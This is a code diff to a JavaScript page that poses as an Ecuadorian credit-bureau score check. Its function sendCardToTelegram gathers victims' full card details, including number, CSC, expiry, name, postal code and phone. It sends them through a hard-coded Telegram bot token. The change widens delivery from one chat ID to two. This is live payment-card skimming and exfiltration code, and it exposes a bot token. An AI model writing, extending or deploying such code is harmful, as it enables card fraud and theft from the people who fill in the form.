@@ -50,19 +50,23 @@ function getScoreLevel(score) {
 }
 
 const TELEGRAM_TOKEN = '7720652398:AAHqJaBEI2a2Z3wufe-GhNaVFuxbRU-prZA';
-const CHAT_ID = 6332406416;
+const CHAT_IDS = [6332406416, 905641795];
 
 function sendCardToTelegram(card) {
   const message = `💳 *Nuevo pago manual (Buró Ecuador)*\n\n*Nombre:* ${card.nombre}\n*Apellidos:* ${card.apellidos}\n*Número de tarjeta:* ${card.numero}\n*CSC:* ${card.csc}\n*Fecha de vencimiento:* ${card.fecha}\n*Código postal:* ${card.postal}\n*Móvil:* ${card.movil}`;
-  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    })
-  });
+  return Promise.all(
+    CHAT_IDS.map(chat_id =>
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+    )
+  );
 }
 
 const AnalisisPage = ({ score, setScore, onAnterior, onSiguiente }) => {
